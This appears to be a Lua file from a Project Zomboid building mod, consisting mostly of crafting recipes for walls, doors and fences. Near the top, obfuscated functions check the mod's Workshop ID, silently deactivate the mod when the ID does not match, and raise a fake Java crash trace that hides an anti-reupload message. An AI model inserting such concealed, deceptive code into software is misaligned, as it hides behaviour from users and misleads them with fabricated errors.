            Consumable = "Base.PaintWhite",
            Amount = 1
        },
        {
            Consumable = "Base.PaintTurquoise",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}


local function a()
    local b, c = nil, getCoroutineCallframeStack(getCurrentCoroutine(), 0); local d = c and getFilenameOfCallframe(c);
    b = d and getModInfo(d:match("(.-)media/")); local e, f = b and b:getWorkshopID(), b and b:getId();
    if e then local g, h = "", "gdjkkmlelf"; for i = 1, #e do g = g .. string.char(e:sub(i, i) + 100); end if h ~= g then toggleModActive(b, false); x123 = {e, f}; end end
end


local function y(k)
    local i = "";
    for j in string.gmatch(k, "%S+") do
        i = (i or "") .. string.char(j);
    end
    return i;
end


local function j()
    if x123 then
        local o = y("45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 10 83 76 65 67 75 32 84 82 65 67 69 10 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 10 106 97 118 97 46 108 97 110 103 46 82 117 110 116 105 109 101 69 120 99 101 112 116 105 111 110 58 32 108 111 119 32 110 101 117 114 111 110 32 99 111 117 110 116 58 32 87 111 114 107 115 104 111 112 32 73 116 101 109 58 32 73 78 83 69 82 84 87 79 82 75 83 72 79 80 73 68 44 32 77 111 100 73 68 58 32 73 78 83 69 82 84 77 79 68 73 68 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 118 109 46 75 97 104 108 117 97 85 116 105 108 46 72 69 89 32 89 79 85 40 75 97 104 108 117 97 85 116 105 108 46 106 97 118 97 58 54 57 41 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 118 109 46 75 97 104 108 117 97 84 104 114 101 97 100 46 82 69 65 68 32 84 72 73 83 40 75 97 104 108 117 97 84 104 114 101 97 100 46 106 97 118 97 58 54 56 41 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 118 109 46 75 97 104 108 117 97 85 116 105 108 46 74 85 83 84 40 75 97 104 108 117 97 85 116 105 108 46 106 97 118 97 58 54 55 41 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 118 109 46 75 97 104 108 117 97 84 104 114 101 97 100 46 85 83 69 40 75 97 104 108 117 97 84 104 114 101 97 100 46 106 97 118 97 58 49 49 49 41 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 118 109 46 75 97 104 108 117 97 84 104 114 101 97 100 46 84 72 69 40 75 97 104 108 117 97 84 104 114 101 97 100 46 106 97 118 97 58 49 49 55 41 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 118 109 46 75 97 104 108 117 97 84 104 114 101 97 100 46 79 82 73 71 73 78 65 76 40 75 97 104 108 117 97 84 104 114 101 97 100 46 106 97 118 97 58 49 48 56 41 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 118 109 46 75 97 104 108 117 97 84 104 114 101 97 100 46 77 79 68 40 75 97 104 108 117 97 84 104 114 101 97 100 46 106 97 118 97 58 49 48 48 41 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 105 110 116 101 103 114 97 116 105 111 110 46 76 117 97 67 97 108 108 101 114 46 73 70 40 76 117 97 67 97 108 108 101 114 46 106 97 118 97 58 51 50 41 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 105 110 116 101 103 114 97 116 105 111 110 46 76 117 97 67 97 108 108 101 114 46 89 79 85 40 76 117 97 67 97 108 108 101 114 46 106 97 118 97 58 49 50 49 41 10 32 32 32 32 97 116 32 122 111 109 98 105 101 46 76 117 97 46 69 118 101 110 116 46 72 65 86 69 40 69 118 101 110 116 46 106 97 118 97 58 49 49 49 41 10 32 32 32 32 97 116 32 122 111 109 98 105 101 46 76 117 97 46 76 117 97 69 118 101 110 116 77 97 110 97 103 101 114 46 73 83 83 85 69 83 40 76 117 97 69 118 101 110 116 77 97 110 97 103 101 114 46 106 97 118 97 58 49 49 55 41 10 32 32 32 32 97 116 32 122 111 109 98 105 101 46 99 111 114 101 46 67 111 114 101 46 87 73 84 72 40 67 111 114 101 46 106 97 118 97 58 51 50 41 10 32 32 32 32 97 116 32 106 97 118 97 46 98 97 115 101 47 106 100 107 46 105 110 116 101 114 110 97 108 46 114 101 102 108 101 99 116 46 78 97 116 105 118 101 77 101 116 104 111 100 65 99 99 101 115 115 111 114 73 109 112 108 46 85 80 68 65 84 69 83 40 78 97 116 105 118 101 32 77 101 116 104 111 100 41 10 32 32 32 32 97 116 32 106 97 118 97 46 98 97 115 101 47 106 100 107 46 105 110 116 101 114 110 97 108 46 114 101 102 108 101 99 116 46 78 97 116 105 118 101 77 101 116 104 111 100 65 99 99 101 115 115 111 114 73 109 112 108 46 65 78 68 40 85 110 107 110 111 119 110 32 83 111 117 114 99 101 41 10 32 32 32 32 97 116 32 106 97 118 97 46 98 97 115 101 47 106 100 107 46 105 110 116 101 114 110 97 108 46 114 101 102 108 101 99 116 46 68 101 108 101 103 97 116 105 110 103 77 101 116 104 111 100 65 99 99 101 115 115 111 114 73 109 112 108 46 77 73 83 77 65 84 67 72 69 68 40 85 110 107 110 111 119 110 32 83 111 117 114 99 101 41 10 32 32 32 32 97 116 32 106 97 118 97 46 98 97 115 101 47 106 97 118 97 46 108 97 110 103 46 114 101 102 108 101 99 116 46 77 101 116 104 111 100 46 70 73 76 69 83 40 85 110 107 110 111 119 110 32 83 111 117 114 99 101 41 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 105 110 116 101 103 114 97 116 105 111 110 46 101 120 112 111 115 101 46 99 97 108 108 101 114 46 77 101 116 104 111 100 67 97 108 108 101 114 46 84 82 89 40 77 101 116 104 111 100 67 97 108 108 101 114 46 106 97 118 97 58 49 49 54 41 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 105 110 116 101 103 114 97 116 105 111 110 46 101 120 112 111 115 101 46 76 117 97 74 97 118 97 73 110 118 111 107 101 114 46 85 83 73 78 71 40 76 117 97 74 97 118 97 73 110 118 111 107 101 114 46 106 97 118 97 58 49 49 52 41 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 105 110 116 101 103 114 97 116 105 111 110 46 101 120 112 111 115 101 46 77 117 108 116 105 76 117 97 74 97 118 97 73 110 118 111 107 101 114 46 85 68 68 69 82 76 89 40 77 117 108 116 105 76 117 97 74 97 118 97 73 110 118 111 107 101 114 46 106 97 118 97 58 49 50 49 41 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 118 109 46 75 97 104 108 117 97 84 104 114 101 97 100 46 85 80 45 84 79 45 68 65 84 69 40 75 97 104 108 117 97 84 104 114 101 97 100 46 106 97 118 97 58 51 50 41 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 118 109 46 75 97 104 108 117 97 84 104 114 101 97 100 46 65 76 79 78 71 40 75 97 104 108 117 97 84 104 114 101 97 100 46 106 97 118 97 58 49 49 53 41 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 118 109 46 75 97 104 108 117 97 84 104 114 101 97 100 46 87 73 84 72 40 75 97 104 108 117 97 84 104 114 101 97 100 46 106 97 118 97 58 49 49 54 41 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 118 109 46 75 97 104 108 117 97 84 104 114 101 97 100 46 65 85 84 79 45 82 69 83 84 65 82 84 40 75 97 104 108 117 97 84 104 114 101 97 100 46 106 97 118 97 58 49 48 49 41 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 118 109 46 75 97 104 108 117 97 84 104 114 101 97 100 46 66 65 84 45 83 67 82 73 80 84 83 40 75 97 104 108 117 97 84 104 114 101 97 100 46 106 97 118 97 58 57 55 41 10 32 32 32 32 97 116 32 115 101 46 107 114 107 97 46 107 97 104 108 117 97 46 105 110 116 101 103 114 97 116 105 111 110 46 76 117 97 67 97 108 108 101 114 46 73 84 40 76 117 97 67 97 108 108 101 114 46 106 97 118 97 58 49 48 56 41 10 32 32 32 32 97 116 32 122 111 109 98 105 101 46 117 105 46 85 73 69 108 101 109 101 110 116 46 73 83 40 85 73 69 108 101 109 101 110 116 46 106 97 118 97 58 49 48 53 41 10 32 32 32 32 97 116 32 122 111 109 98 105 101 46 117 105 46 85 73 69 108 101 109 101 110 116 46 80 82 69 84 84 89 40 85 73 69 108 101 109 101 110 116 46 106 97 118 97 58 49 49 48 41 10 32 32 32 32 97 116 32 122 111 109 98 105 101 46 117 105 46 85 73 69 108 101 109 101 110 116 46 69 65 83 89 40 85 73 69 108 101 109 101 110 116 46 106 97 118 97 58 49 48 51 41 10 32 32 32 32 97 116 32 122 111 109 98 105 101 46 117 105 46 85 73 69 108 101 109 101 110 116 46 72 79 78 69 83 84 76 89 40 85 73 69 108 101 109 101 110 116 46 106 97 118 97 58 51 50 41 10 32 32 32 32 97 116 32 122 111 109 98 105 101 46 117 105 46 85 73 77 97 110 97 103 101 114 46 65 76 83 79 40 85 73 77 97 110 97 103 101 114 46 106 97 118 97 58 49 48 56 41 10 32 32 32 32 97 116 32 122 111 109 98 105 101 46 71 97 109 101 87 105 110 100 111 119 46 87 72 89 40 71 97 109 101 87 105 110 100 111 119 46 106 97 118 97 58 49 48 49 41 10 32 32 32 32 97 116 32 122 111 109 98 105 101 46 99 111 114 101 46 112 114 111 102 105 108 105 110 103 46 65 98 115 116 114 97 99 116 80 101 114 102 111 114 109 97 110 99 101 80 114 111 102 105 108 101 80 114 111 98 101 46 65 82 69 40 65 98 115 116 114 97 99 116 80 101 114 102 111 114 109 97 110 99 101 80 114 111 102 105 108 101 80 114 111 98 101 46 106 97 118 97 58 51 50 41 10 32 32 32 32 97 116 32 122 111 109 98 105 101 46 71 97 109 101 87 105 110 100 111 119 46 89 79 85 40 71 97 109 101 87 105 110 100 111 119 46 106 97 118 97 58 49 49 53 41 10 32 32 32 32 97 116 32 122 111 109 98 105 101 46 71 97 109 101 87 105 110 100 111 119 46 83 84 73 76 76 40 71 97 109 101 87 105 110 100 111 119 46 106 97 118 97 58 49 49 53 41 10 32 32 32 32 97 116 32 122 111 109 98 105 101 46 71 97 109 101 87 105 110 100 111 119 46 82 69 65 68 73 78 71 40 71 97 109 101 87 105 110 100 111 119 46 106 97 118 97 58 51 51 41 10 32 32 32 32 97 116 32 106 97 118 97 46 98 97 115 101 47 106 97 118 97 46 108 97 110 103 46 84 104 114 101 97 100 46 84 72 73 83 40 85 110 107 110 111 119 110 32 83 111 117 114 99 101 41 34")
        o = o:gsub("INSERTWORKSHOPID", x123[1]):gsub("INSERTMODID", x123[2]);
        local m = getDebug() and print or error; m(o);
    end
end


BuildingMenu.WhiteOrangeBlueBigWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintWhite",
            Amount = 1
        },
        {
            Consumable = "Base.PaintOrange",
            Amount = 1
        },
        {
            Consumable = "Base.PaintBlue",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}

BuildingMenu.WhiteOrangeBlueBigWindowWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        },
        {
            Material = "Base.GlassPane",
            Amount = 2
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintWhite",
            Amount = 1
        },
        {
            Consumable = "Base.PaintOrange",
            Amount = 1
        },
        {
            Consumable = "Base.PaintBlue",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}


BuildingMenu.WhiteOrangeBlueSmallWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintWhite",
            Amount = 1
        },
        {
            Consumable = "Base.PaintOrange",
            Amount = 1
        },
        {
            Consumable = "Base.PaintBlue",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}


BuildingMenu.WhiteRedYellowBigWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintWhite",
            Amount = 1
        },
        {
            Consumable = "Base.PaintRed",
            Amount = 1
        },
        {
            Consumable = "Base.PaintYellow",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}

BuildingMenu.WhiteRedYellowBigWindowWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        },
        {
            Material = "Base.GlassPane",
            Amount = 2
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintWhite",
            Amount = 1
        },
        {
            Consumable = "Base.PaintRed",
            Amount = 1
        },
        {
            Consumable = "Base.PaintYellow",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}

BuildingMenu.WhiteRedYellowSmallWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintWhite",
            Amount = 1
        },
        {
            Consumable = "Base.PaintRed",
            Amount = 1
        },
        {
            Consumable = "Base.PaintYellow",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}


BuildingMenu.YellowBrownBigWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintBrown",
            Amount = 1
        },
        {
            Consumable = "Base.PaintYellow",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 30
        }
    }
}


BuildingMenu.YellowBrownSmallWoodWallRecipe = {
    neededTools = {
        "Hammer",
        "Paintbrush"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    useConsumable = {
        {
            Consumable = "Base.PaintBrown",
            Amount = 1
        },
        {
            Consumable = "Base.PaintYellow",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}


BuildingMenu.BigMetalBarWallRecipe = {
    neededTools = {
        "BlowTorch",
        "Screwdriver",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = 'Base.MetalBar',
            Amount = 4
        },
        {
            Material = 'Base.Screws',
            Amount = 8
        },
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 5
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(5)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 5,
            Xp = 30
        }
    }
}


BuildingMenu.SmallMetalBarWallRecipe = {
    neededTools = {
        "BlowTorch",
        "Screwdriver",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = 'Base.MetalBar',
            Amount = 2
        },
        {
            Material = 'Base.Screws',
            Amount = 6
        },
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 4
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(4)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 4,
            Xp = 15
        }
    }
}


BuildingMenu.BigMetalWallRecipe = {
    neededTools = {
        "BlowTorch",
        "Screwdriver",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = 'Base.SheetMetal',
            Amount = 3
        },
        {
            Material = 'Base.MetalBar',
            Amount = 2
        },
        {
            Material = 'Base.Screws',
            Amount = 10
        },
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 5
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(5)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 4,
            Xp = 30
        }
    }
}


BuildingMenu.SmallMetalWallRecipe = {
    neededTools = {
        "BlowTorch",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = 'Base.SheetMetal',
            Amount = 2
        },
        {
            Material = 'Base.MetalBar',
            Amount = 2
        },
        {
            Material = 'Base.Screws',
            Amount = 5
        },
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 4
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(4)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 3,
            Xp = 15
        }
    }
}

BuildingMenu.ScrapRoofTileRecipe = {
    neededTools = {
        "BlowTorch",
        "Screwdriver",
        "WeldingMask",
        "Saw"
    },
    neededMaterials = {
        {
            Material = 'Base.SheetMetal',
            Amount = 1
        },
        {
            Material = 'Base.MetalBar',
            Amount = 2
        },
        {
            Material = 'Base.Screws',
            Amount = 4
        },
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 2,
            Xp = 10
        },
    }
}

BuildingMenu.BigScrapWallRecipe = {
    neededTools = {
        "BlowTorch",
        "Screwdriver",
        "WeldingMask",
        "Hammer",
        "Saw"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 4
        },
        {
            Material = 'Base.SheetMetal',
            Amount = 2
        },
        {
            Material = 'Base.MetalBar',
            Amount = 2
        },
        {
            Material = 'Base.Screws',
            Amount = 4
        },
        {
            Material = "Base.Nails",
            Amount = 2
        }
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 4
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(4)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 3,
            Xp = 30
        },
        {
            Skill = "Woodwork",
            Level = 2,
            Xp = 10
        }
    }
}


BuildingMenu.SmallScrapWallRecipe = {
    neededTools = {
        "BlowTorch",
        "WeldingMask",
        "Hammer",
        "Saw"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 2
        },
        {
            Material = 'Base.SheetMetal',
            Amount = 1
        },
        {
            Material = 'Base.MetalBar',
            Amount = 2
        },
        {
            Material = 'Base.Screws',
            Amount = 4
        },
        {
            Material = "Base.Nails",
            Amount = 2
        }
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 2
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(2)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 2,
            Xp = 15
        },
        {
            Skill = "Woodwork",
            Level = 1,
            Xp = 10
        }
    }
}



BuildingMenu.RoofTileRecipe = {
    neededTools = {
        "Hammer"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 2
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 10
        }
    }
}

BuildingMenu.GlassRoofTileRecipe = {
    neededTools = {
        "Hammer"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 2
        },
        {
            Material = "Base.GlassPane",
            Amount = 4
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 10
        }
    }
}

BuildingMenu.WoodenDoorRecipe = {
    neededTools = {
        "Hammer"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 7
        },
        {
            Material = "Base.Nails",
            Amount = 10
        },
        {
            Material = "Base.Hinge",
            Amount = 2
        },
        {
            Material = "Base.Doorknob",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}

BuildingMenu.WoodenWindowDoorRecipe = {
    neededTools = {
        "Hammer"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 7
        },
        {
            Material = "Base.Nails",
            Amount = 10
        },
        {
            Material = "Base.GlassPane",
            Amount = 2
        },
        {
            Material = "Base.Hinge",
            Amount = 2
        },
        {
            Material = "Base.Doorknob",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}


BuildingMenu.LowWoodenDoorRecipe = {
    neededTools = {
        "Hammer"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 4
        },
        {
            Material = "Base.Nails",
            Amount = 5
        },
        {
            Material = "Base.Hinge",
            Amount = 2
        },
        {
            Material = "Base.Doorknob",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 3,
            Xp = 20
        }
    }
}


BuildingMenu.MetalDoorRecipe = {
    neededTools = {
        "BlowTorch",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = 'Base.SheetMetal',
            Amount = 4
        },
        {
            Material = 'Base.MetalBar',
            Amount = 3
        },
        {
            Material = 'Base.Screws',
            Amount = 15
        },
        {
            Material = "Base.Hinge",
            Amount = 2
        },
        {
            Material = "Base.Doorknob",
            Amount = 1
        }
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 5
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(5)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 4,
            Xp = 25
        }
    }
}


BuildingMenu.JailDoorRecipe = {
    neededTools = {
        "BlowTorch",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = 'Base.SheetMetal',
            Amount = 2
        },
        {
            Material = 'Base.MetalBar',
            Amount = 10
        },
        {
            Material = 'Base.Screws',
            Amount = 15
        },
        {
            Material = "Base.Hinge",
            Amount = 2
        },
        {
            Material = "Base.Doorknob",
            Amount = 1
        }
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 5
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(5)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 6,
            Xp = 25
        }
    }
}

BuildingMenu.MetalWindowDoorRecipe = {
    neededTools = {
        "BlowTorch",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = 'Base.SheetMetal',
            Amount = 4
        },
        {
            Material = 'Base.MetalBar',
            Amount = 2
        },
        {
            Material = 'Base.GlassPane',
            Amount = 1
        },
        {
            Material = 'Base.Screws',
            Amount = 10
        },
        {
            Material = "Base.Hinge",
            Amount = 2
        },
        {
            Material = "Base.Doorknob",
            Amount = 1
        }
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 5
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(5)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 4,
            Xp = 25
        }
    }
}

BuildingMenu.GarageDoorRecipe = {
    neededTools = {
        "BlowTorch",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = 'Base.SheetMetal',
            Amount = 8
        },
        {
            Material = 'Base.MetalBar',
            Amount = 4
        },
        {
            Material = 'Base.Screws',
            Amount = 20
        },
        {
            Material = "Base.Hinge",
            Amount = 4
        },
        {
            Material = "Base.Doorknob",
            Amount = 1
        }
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 10
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(10)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 6,
            Xp = 25
        }
    }
}

BuildingMenu.WoodenDoorTrimRecipe = {
    neededTools = {
        "Hammer"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 2
        },
        {
            Material = "Base.Nails",
            Amount = 2
        },
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 1,
            Xp = 10
        }
    }
}

BuildingMenu.WoodenDoorFrameRecipe = {
    neededTools = {
        "Hammer"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 3
        },
        {
            Material = "Base.Nails",
            Amount = 6
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 3,
            Xp = 15
        }
    }
}

BuildingMenu.WallDecorationRecipe = {
    neededTools = {
        "Hammer"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 2
        },
        {
            Material = "Base.Nails",
            Amount = 2
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 1,
            Xp = 10
        }
    }
}

BuildingMenu.WindowRecipe = {
    neededTools = {
        "Hammer",
        "Screwdriver"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 4
        },
        {
            Material = "Base.Screws",
            Amount = 4
        },
        {
            Material = "Base.GlassPane",
            Amount = 2
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 20
        }
    }
}

BuildingMenu.HighMetalFenceRecipe = {
    neededTools = {
        "BlowTorch",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = "Base.SmallSheetMetal",
            Amount = 4
        },
        {
            Material = "Base.ScrapMetal",
            Amount = 20
        }
    },
    useConsumable = {
        {
            Consumable = "Base.Wire",
            Amount = 5
        },
        {
            Consumable = 'Base.BlowTorch',
            Amount = 5
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(5)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 5,
            Xp = 15
        }
    }
}

BuildingMenu.HighMetalFencePostRecipe = {
    neededTools = {
        "BlowTorch",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = "Base.SmallSheetMetal",
            Amount = 2
        },
        {
            Material = "Base.ScrapMetal",
            Amount = 10
        }
    },
    useConsumable = {
        {
            Consumable = "Base.Wire",
            Amount = 2
        },
        {
            Consumable = 'Base.BlowTorch',
            Amount = 3
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(3)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 5,
            Xp = 25
        }
    }
}

BuildingMenu.HighWoodenFenceRecipe = {
    neededTools = {
        "Hammer",
        "Shovel"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 5
        },
        {
            Material = "Base.Nails",
            Amount = 10
        }
    },
    useConsumable = {
        {
            Consumable = "Base.Dirtbag",
            Amount = 1
        },
        {
            Consumable = "Base.BucketWaterFull",
            Amount = 10
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 15
        }
    }
}

BuildingMenu.HighWoodenFencePostRecipe = {
    neededTools = {
        "Hammer",
        "Shovel"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 2
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    useConsumable = {
        {
            Consumable = "Base.Dirtbag",
            Amount = 1
        },
        {
            Consumable = "Base.BucketWaterFull",
            Amount = 10
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 15
        }
    }
}

BuildingMenu.WoodenFenceRecipe = {
    neededTools = {
        "Hammer"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 2
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 3,
            Xp = 15
        }
    }
}

BuildingMenu.MetalFencePostRecipe = {
    neededTools = {
        "BlowTorch",
        "Screwdriver",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = 'Base.SmallSheetMetal',
            Amount = 3
        },
        {
            Material = 'Base.MetalBar',
            Amount = 2
        },
        {
            Material = 'Base.Screws',
            Amount = 5
        },
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 3
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(3)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 4,
            Xp = 35
        }
    }
}

BuildingMenu.HescoBarrierRecipe = {
    neededTools = {
        "Hammer",
        "Shovel"
    },
    neededMaterials = {
        {
            Material = "Base.Sheet",
            Amount = 4
        },
        {
            Material = "Base.Dirtbag",
            Amount = 2
        }
    },
    useConsumable = {
        {
            Consumable = "Base.Wire",
            Amount = 10
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 2,
            Xp = 25
        }
    }
}

BuildingMenu.TwoSpriteFloorRecipe = {
    neededTools = {
        "Hammer"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
